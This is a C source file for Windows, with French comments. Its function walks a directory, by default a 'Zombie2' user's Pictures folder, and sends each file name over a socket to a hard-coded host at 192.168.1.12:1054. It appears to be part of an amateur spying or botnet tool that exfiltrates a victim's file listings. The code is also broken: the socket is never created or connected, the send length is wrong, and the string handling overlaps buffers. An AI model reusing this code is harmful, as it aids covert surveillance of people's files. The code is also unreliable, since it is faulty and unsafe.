#include <winsock2.h>
#include "proto.h"
#include <stdio.h>

int enumfiles( char * dir, char * nameext )
{
	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr("192.168.1.12");
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(1054);
	HANDLE hfind;
	WIN32_FIND_DATA wfd;

	// Initialise la recherche
	
	char directory[MAX_PATH];
	char file[MAX_PATH];

	if ( dir )
		strcpy( directory, dir );
	else
		strcpy( directory, "C:\\Users\\Zombie2\\Pictures\\" );

	if ( nameext )
		strcpy( file, nameext );
	else
		strcpy( file, "*.*" );

	if (  directory[ strlen( directory) - 1 ] != '\\' )
		strcpy( directory, strcat( directory, "\\" ));

	strcpy( file, strcat( directory, file ));

	//printf( "Exploration de " );
	//printf( file );
	//printf( "\n" );


	hfind = FindFirstFile( file, &wfd);

	//Si quelque chose à été trouver
	if (hfind == INVALID_HANDLE_VALUE) return 1;

	FILETIME ftCreate, ftAccess, ftWrite;
	SYSTEMTIME stUTC, stLocal;

	do
	{
		// Si ce n'est pas le répertoire courant DOS ...
		if (wfd.cFileName[0] != '.')
		{
		// Affiche le nom du fichier trouver
			printf(wfd.cFileName);
			send(sock, wfd.cFileName, sizeof(file), 0);
			printf(" - ");

			dateconvert(&wfd.ftCreationTime);
			dateconvert(&wfd.ftLastAccessTime);
			dateconvert(&wfd.ftLastWriteTime);
			printf("\n");

		}
	}
	
	//Recherche le prochain fichier
	while (FindNextFile(hfind, &wfd));

	// Recherche terminer, ferme la recherche
	FindClose(hfind);

    closesocket(sock);
    WSACleanup();
	return 0;
}		

